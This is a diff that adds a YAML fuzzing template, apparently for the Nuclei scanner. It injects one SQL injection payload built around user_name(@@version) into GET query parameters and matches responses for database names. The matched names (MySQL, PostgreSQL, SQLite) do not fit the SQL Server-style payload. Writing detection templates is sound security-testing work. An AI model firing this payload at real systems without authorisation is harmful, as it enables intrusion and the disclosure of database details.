@@ -1,0 +1,42 @@
+id: fuzz-sqli-user-name
+
+info:
+  name: SQL Injection Detection for User Name Version Check
+  author: netbaan
+  severity: high
+  description: |
+    This template tests for SQL injection vulnerabilities using a specific payload 
+    to check the database version through user name.
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'  # Run only on GET requests
+
+    payloads:
+      sqli:
+        - "qaramany\\'%2buser_name(@@version)--"
+
+    stop-at-first-match: true
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{sqli}}"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "MySQL"   # Example response indicating MySQL is present
+          - "PostgreSQL"   # You can add other database types as necessary
+          - "SQLite"
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
